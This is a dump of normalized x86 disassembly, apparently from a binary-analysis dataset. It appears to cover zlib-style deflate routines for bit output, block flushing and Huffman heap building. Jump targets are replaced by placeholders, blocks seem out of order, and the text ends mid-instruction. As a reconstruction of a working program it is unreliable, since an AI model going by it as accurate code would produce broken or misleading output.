mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
sar edx 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov edx [ ebp - 0x8 ]
and edx 0xffff
mov eax [ ebp + 0x8 ]
mov ecx 0x10
sub ecx [ eax + 0x16b4 ]
sar edx cl
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] dx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
mov ecx [ ebp - 0x4 ]
lea edx [ eax + ecx - 0x10 ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b4 ] edx
jmp r-xdata
xor ecx ecx
mov cx [ r--data ]
mov edx ecx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x16b4 ]
shl edx cl
mov ecx [ ebp + 0x8 ]
mov ax [ ecx + 0x16b0 ]
or ax dx
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] ax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
add eax [ ebp - 0xc ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b4 ] eax
xor eax eax
mov ax [ r--data ]
mov [ ebp - 0x10 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x10 ]
mov ecx [ ecx + 0x16b4 ]
shl edx cl
mov eax [ ebp + 0x8 ]
mov cx [ eax + 0x16b0 ]
or cx dx
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16b0 ] cx
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cx [ eax + 0x16b0 ]
and ecx 0xff
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x14 ]
mov [ eax + edx ] cl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x14 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x14 ] ecx
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cx [ eax + 0x16b0 ]
sar ecx 0x8
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x14 ]
mov [ eax + edx ] cl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x14 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x14 ] ecx
mov eax [ ebp - 0x10 ]
and eax 0xffff
mov ecx [ ebp + 0x8 ]
mov edx 0x10
sub edx [ ecx + 0x16b4 ]
mov ecx edx
sar eax cl
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] ax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
mov ecx [ ebp - 0xc ]
lea edx [ eax + ecx - 0x10 ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b4 ] edx
jmp r-xdata
xor eax eax
mov ax [ r--data ]
mov [ ebp - 0xc ] eax
mov ecx 0x10
sub ecx [ ebp - 0xc ]
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x16b4 ] ecx
jle r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16ac ] 0x7
mov esp ebp
pop ebp
retn
mov [ ebp - 0x14 ] 0x3
mov eax 0x10
sub eax [ ebp - 0x14 ]
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x16b4 ] eax
jle r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_40895d
add esp 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x16ac ]
add ecx 0xb
mov edx [ ebp + 0x8 ]
sub ecx [ edx + 0x16b4 ]
cmp ecx 0x9
jge r-xdata
mov ecx [ ebp + 0x8 ]
mov edx 0x2
mov ecx [ ecx + 0x16b4 ]
shl edx cl
mov eax [ ebp + 0x8 ]
mov cx [ eax + 0x16b0 ]
or cx dx
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16b0 ] cx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x16b4 ]
add ecx [ ebp - 0x14 ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16b4 ] ecx
mov [ ebp - 0x18 ] 0x2
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x18 ]
mov ecx [ edx + 0x16b4 ]
shl eax cl
mov ecx [ ebp + 0x8 ]
mov dx [ ecx + 0x16b0 ]
or dx ax
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b0 ] dx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
and edx 0xff
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
sar edx 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov edx [ ebp - 0x18 ]
and edx 0xffff
mov eax [ ebp + 0x8 ]
mov ecx 0x10
sub ecx [ eax + 0x16b4 ]
sar edx cl
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] dx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
mov ecx [ ebp - 0x14 ]
lea edx [ eax + ecx - 0x10 ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b4 ] edx
jmp r-xdata
xor ecx ecx
mov cx [ r--data ]
mov edx ecx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x16b4 ]
shl edx cl
mov ecx [ ebp + 0x8 ]
mov ax [ ecx + 0x16b0 ]
or ax dx
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] ax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
add eax [ ebp - 0x1c ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b4 ] eax
xor eax eax
mov ax [ r--data ]
mov [ ebp - 0x20 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x20 ]
mov ecx [ ecx + 0x16b4 ]
shl edx cl
mov eax [ ebp + 0x8 ]
mov cx [ eax + 0x16b0 ]
or cx dx
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16b0 ] cx
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cx [ eax + 0x16b0 ]
and ecx 0xff
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x14 ]
mov [ eax + edx ] cl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x14 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x14 ] ecx
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cx [ eax + 0x16b0 ]
sar ecx 0x8
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x14 ]
mov [ eax + edx ] cl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x14 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x14 ] ecx
mov eax [ ebp - 0x20 ]
and eax 0xffff
mov ecx [ ebp + 0x8 ]
mov edx 0x10
sub edx [ ecx + 0x16b4 ]
mov ecx edx
sar eax cl
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] ax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
mov ecx [ ebp - 0x1c ]
lea edx [ eax + ecx - 0x10 ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b4 ] edx
jmp r-xdata
xor eax eax
mov ax [ r--data ]
mov [ ebp - 0x1c ] eax
mov ecx 0x10
sub ecx [ ebp - 0x1c ]
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x16b4 ] ecx
jle r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_40895d
add esp 0x4
sub_405fb2
push ebp
mov ebp esp
sub esp 0x1c
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x7c ] 0x0
jle r-xdata
mov eax [ ebp + 0x10 ]
add eax 0x5
mov [ ebp - 0x8 ] eax
mov ecx [ ebp - 0x8 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dl [ ecx + 0x1c ]
cmp edx 0x2
jne r-xdata
mov ecx [ ebp - 0x8 ]
cmp ecx [ ebp - 0xc ]
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
add ecx 0xb10
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_40636e
add esp 0x8
mov eax [ ebp + 0x8 ]
add eax 0xb1c
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_40636e
add esp 0x8
mov edx [ ebp + 0x8 ]
push edx
call sub_406ca5
add esp 0x4
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x16a0 ]
add ecx 0xa
shr ecx 0x3
mov [ ebp - 0xc ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16a4 ]
add eax 0xa
shr eax 0x3
mov [ ebp - 0x8 ] eax
mov ecx [ ebp - 0x8 ]
cmp ecx [ ebp - 0xc ]
ja r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_40886a
add esp 0x4
mov [ ebp - 0x18 ] 0x3
mov eax 0x10
sub eax [ ebp - 0x18 ]
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x16b4 ] eax
jle r-xdata
mov [ ebp - 0x10 ] 0x3
mov edx 0x10
sub edx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x16b4 ] edx
jle r-xdata
mov eax [ ebp + 0x14 ]
push eax
mov ecx [ ebp + 0x10 ]
push ecx
mov edx [ ebp + 0xc ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_405984
add esp 0x10
jmp r-xdata
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov [ ebp - 0xc ] edx
mov edx [ ebp + 0x14 ]
add edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x16b4 ]
shl edx cl
mov ecx [ ebp + 0x8 ]
mov ax [ ecx + 0x16b0 ]
or ax dx
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] ax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
add eax [ ebp - 0x18 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b4 ] eax
mov edx [ ebp + 0x14 ]
add edx 0x4
mov [ ebp - 0x1c ] edx
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x1c ]
mov ecx [ eax + 0x16b4 ]
shl edx cl
mov eax [ ebp + 0x8 ]
mov cx [ eax + 0x16b0 ]
or cx dx
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16b0 ] cx
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cx [ eax + 0x16b0 ]
and ecx 0xff
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x14 ]
mov [ eax + edx ] cl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x14 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x14 ] ecx
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cx [ eax + 0x16b0 ]
sar ecx 0x8
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x14 ]
mov [ eax + edx ] cl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x14 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x14 ] ecx
mov eax [ ebp - 0x1c ]
and eax 0xffff
mov ecx [ ebp + 0x8 ]
mov edx 0x10
sub edx [ ecx + 0x16b4 ]
mov ecx edx
sar eax cl
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] ax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
mov ecx [ ebp - 0x18 ]
lea edx [ eax + ecx - 0x10 ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b4 ] edx
jmp r-xdata
mov edx [ ebp + 0x14 ]
add edx 0x2
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x16b4 ]
shl edx cl
mov ecx [ ebp + 0x8 ]
mov ax [ ecx + 0x16b0 ]
or ax dx
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] ax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
add eax [ ebp - 0x10 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b4 ] eax
mov ecx [ ebp + 0x14 ]
add ecx 0x2
mov [ ebp - 0x14 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x14 ]
mov ecx [ edx + 0x16b4 ]
shl eax cl
mov ecx [ ebp + 0x8 ]
mov dx [ ecx + 0x16b0 ]
or dx ax
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b0 ] dx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
and edx 0xff
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
sar edx 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov edx [ ebp - 0x14 ]
and edx 0xffff
mov eax [ ebp + 0x8 ]
mov ecx 0x10
sub ecx [ eax + 0x16b4 ]
sar edx cl
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] dx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
mov ecx [ ebp - 0x10 ]
lea edx [ eax + ecx - 0x10 ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b4 ] edx
jmp r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_4058bb
add esp 0x4
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov edx [ ebp + 0x10 ]
add edx 0x4
cmp edx [ ebp - 0xc ]
ja r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
push eax
call sub_408a46
add esp 0x4
mov edx [ ebp - 0x4 ]
add edx 0x1
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0xb20 ]
add ecx 0x1
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xb14 ]
add eax 0x1
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_406ef9
add esp 0x10
mov edx [ ebp + 0x8 ]
add edx 0x980
push edx
mov eax [ ebp + 0x8 ]
add eax 0x8c
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_408022
add esp 0xc
push r--data
push r--data
mov edx [ ebp + 0x8 ]
push edx
call sub_408022
add esp 0xc
jmp r-xdata
sub_40636e
push ebp
mov ebp esp
sub esp 0x24
push esi
mov eax [ ebp + 0xc ]
mov ecx [ eax ]
mov [ ebp - 0x10 ] ecx
mov edx [ ebp + 0xc ]
mov eax [ edx + 0x8 ]
mov ecx [ eax ]
mov [ ebp - 0xc ] ecx
mov edx [ ebp + 0xc ]
mov eax [ edx + 0x8 ]
mov ecx [ eax + 0xc ]
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x18 ] 0xffffffff
mov edx [ ebp + 0x8 ]
mov [ edx + 0x1448 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ eax + 0x144c ] 0x23d
mov [ ebp - 0x1c ] 0x0
jmp r-xdata
mov edx [ ebp - 0x1c ]
cmp edx [ ebp - 0x8 ]
jge r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x1448 ] 0x2
jge r-xdata
mov eax [ ebp - 0x1c ]
mov ecx [ ebp - 0x10 ]
xor edx edx
mov dx [ ecx + eax * 4 ]
test edx edx
je r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ ebp - 0x18 ]
mov [ ecx + 0x4 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x1448 ]
cdq
sub eax edx
sar eax 0x1
mov [ ebp - 0x1c ] eax
jmp r-xdata
cmp [ ebp - 0x18 ] 0x2
jge r-xdata
mov eax [ ebp - 0x1c ]
mov ecx [ ebp - 0x10 ]
mov [ ecx + eax * 4 + 0x2 ] 0x0
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x18 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1448 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x1448 ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1448 ]
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x18 ]
mov [ eax + edx * 4 + 0xb54 ] ecx
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0x1c ]
mov [ edx + 0x1450 ] 0x0
jmp r-xdata
cmp [ ebp - 0x1c ] 0x1
jl r-xdata
mov [ ebp - 0x20 ] 0x0
mov eax [ ebp - 0x18 ]
add eax 0x1
mov [ ebp - 0x18 ] eax
mov ecx [ ebp - 0x18 ]
mov [ ebp - 0x20 ] ecx
jmp r-xdata
mov ecx [ ebp - 0x1c ]
add ecx 0x1
mov [ ebp - 0x1c ] ecx
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov [ ebp - 0x4 ] edx
mov edx [ ebp - 0x1c ]
push edx
mov eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_40670e
add esp 0xc
jmp r-xdata
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
xor eax eax
mov ax [ edx + ecx * 4 + 0x2 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x16a4 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16a4 ] edx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x1448 ]
add eax 0x1
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x1448 ] eax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x1448 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x20 ]
mov [ ecx + eax * 4 + 0xb54 ] edx
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x10 ]
mov [ edx + ecx * 4 ] 0x1
mov eax [ ebp + 0x8 ]
add eax [ ebp - 0x4 ]
mov [ eax + 0x1450 ] 0x0
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x16a0 ]
sub edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16a0 ] edx
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
add eax [ ebp - 0x14 ]
xor ecx ecx
mov cl [ eax + 0x1450 ]
mov [ ebp - 0x24 ] ecx
mov ecx [ ebp + 0x8 ]
add ecx [ ebp - 0x1c ]
xor edx edx
mov dl [ ecx + 0x1450 ]
mov [ ebp - 0x24 ] edx
jmp r-xdata
mov ecx [ ebp - 0x1c ]
sub ecx 0x1
mov [ ebp - 0x1c ] ecx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0xb58 ]
mov [ ebp - 0x1c ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x1448 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + eax * 4 + 0xb54 ]
mov [ ecx + 0xb58 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1448 ]
sub edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x1448 ] edx
push 0x1
mov ecx [ ebp - 0x10 ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_40670e
add esp 0xc
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0xb58 ]
mov [ ebp - 0x14 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x144c ]
sub eax 0x1
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x144c ] eax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x144c ]
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x1c ]
mov [ ecx + eax * 4 + 0xb54 ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x144c ]
sub ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x144c ] ecx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x144c ]
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x14 ]
mov [ edx + ecx * 4 + 0xb54 ] eax
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x10 ]
xor eax eax
mov ax [ edx + ecx * 4 ]
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x10 ]
xor esi esi
mov si [ edx + ecx * 4 ]
add eax esi
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x10 ]
mov [ edx + ecx * 4 ] ax
mov eax [ ebp + 0x8 ]
add eax [ ebp - 0x1c ]
xor ecx ecx
mov cl [ eax + 0x1450 ]
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0x14 ]
xor eax eax
mov al [ edx + 0x1450 ]
cmp ecx eax
jl r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x144c ]
sub edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x144c ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x144c ]
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0xb58 ]
mov [ eax + edx * 4 + 0xb54 ] ecx
mov edx [ ebp + 0xc ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_4068ad
add esp 0x8
mov ecx [ ebp + 0x8 ]
add ecx 0xb34
push ecx
mov edx [ ebp - 0x18 ]
push edx
mov eax [ ebp - 0x10 ]
push eax
call sub_406be0
add esp 0xc
pop esi
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x24 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
add eax [ ebp - 0x4 ]
mov [ eax + 0x1450 ] dl
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x10 ]
mov ax [ ebp - 0x4 ]
mov [ edx + ecx * 4 + 0x2 ] ax
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x10 ]
mov ax [ ebp - 0x4 ]
mov [ edx + ecx * 4 + 0x2 ] ax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ ecx + 0xb58 ] edx
mov eax [ ebp - 0x4 ]
add eax 0x1
mov [ ebp - 0x4 ] eax
push 0x1
mov ecx [ ebp - 0x10 ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_40670e
add esp 0xc
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x1448 ] 0x2
jge r-xdata
sub_40670e
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + eax * 4 + 0xb54 ]
mov [ ebp - 0x4 ] edx
mov eax [ ebp + 0x10 ]
shl eax 0x1
mov [ ebp - 0x8 ] eax
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ edx + ecx * 4 + 0xb54 ] eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
cmp ecx [ eax + 0x1448 ]
jge r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0xc ]
xor edx edx
mov dx [ ecx + eax * 4 ]
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + eax * 4 + 0xb54 ]
mov ecx [ ebp + 0xc ]
xor esi esi
mov si [ ecx + eax * 4 ]
cmp edx esi
jl r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + edx * 4 + 0xb58 ]
mov edx [ ebp + 0xc ]
xor eax eax
mov ax [ edx + ecx * 4 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
mov ecx [ edx + ecx * 4 + 0xb54 ]
mov edx [ ebp + 0xc ]
xor esi esi
mov si [ edx + ecx * 4 ]
cmp eax esi
jl r-xdata
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0xc ]
xor ecx ecx
mov cx [ eax + edx * 4 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax + edx * 4 + 0xb54 ]
mov eax [ ebp + 0xc ]
xor esi esi
mov si [ eax + edx * 4 ]
cmp ecx esi
jne r-xdata
mov edx [ ebp - 0x8 ]
add edx 0x1
mov [ ebp - 0x8 ] edx
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + eax * 4 + 0xb58 ]
mov eax [ ebp + 0xc ]
xor ecx ecx
mov cx [ eax + edx * 4 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax + edx * 4 + 0xb54 ]
mov eax [ ebp + 0xc ]
xor esi esi
mov si [ eax + edx * 4 ]
cmp ecx esi
jne r-xdata
mov edx [ ebp + 0x10 ]
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
mov esi [ ebp + 0x8 ]
mov ecx [ esi + ecx * 4 + 0xb54 ]
mov [ eax + edx * 4 + 0xb54 ] ecx
mov edx [ ebp - 0x8 ]
mov [ ebp + 0x10 ] edx
mov eax [ ebp - 0x8 ]
shl eax 0x1
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov ecx [ ebp + 0x8 ]
add ecx [ ebp - 0x4 ]
xor edx edx
mov dl [ ecx + 0x1450 ]
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + eax * 4 + 0xb54 ]
mov ecx [ ebp + 0x8 ]
xor ebx ebx
mov bl [ ecx + eax + 0x1450 ]
cmp edx ebx
jg r-xdata
mov ecx [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + ecx * 4 + 0xb58 ]
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dl [ ecx + eax + 0x1450 ]
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + eax * 4 + 0xb54 ]
mov ecx [ ebp + 0x8 ]
xor ebx ebx
mov bl [ ecx + eax + 0x1450 ]
cmp edx ebx
jg r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x8 ]
cmp edx [ ecx + 0x1448 ]
jg r-xdata
sub_4068ad
push ebp
mov ebp esp
sub esp 0x34
push esi
mov eax [ ebp + 0xc ]
mov ecx [ eax ]
mov [ ebp - 0x10 ] ecx
mov edx [ ebp + 0xc ]
mov eax [ edx + 0x4 ]
mov [ ebp - 0x34 ] eax
mov ecx [ ebp + 0xc ]
mov edx [ ecx + 0x8 ]
mov eax [ edx ]
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0xc ]
mov edx [ ecx + 0x8 ]
mov eax [ edx + 0x4 ]
mov [ ebp - 0x14 ] eax
mov ecx [ ebp + 0xc ]
mov edx [ ecx + 0x8 ]
mov eax [ edx + 0x8 ]
mov [ ebp - 0x2c ] eax
mov ecx [ ebp + 0xc ]
mov edx [ ecx + 0x8 ]
mov eax [ edx + 0x10 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] 0x0
mov [ ebp - 0x18 ] 0x0
jmp r-xdata
cmp [ ebp - 0x18 ] 0xf
jg r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x144c ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + edx * 4 + 0xb54 ]
mov edx [ ebp - 0x10 ]
mov [ edx + ecx * 4 + 0x2 ] 0x0
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x144c ]
add ecx 0x1
mov [ ebp - 0x20 ] ecx
jmp r-xdata
mov edx [ ebp - 0x18 ]
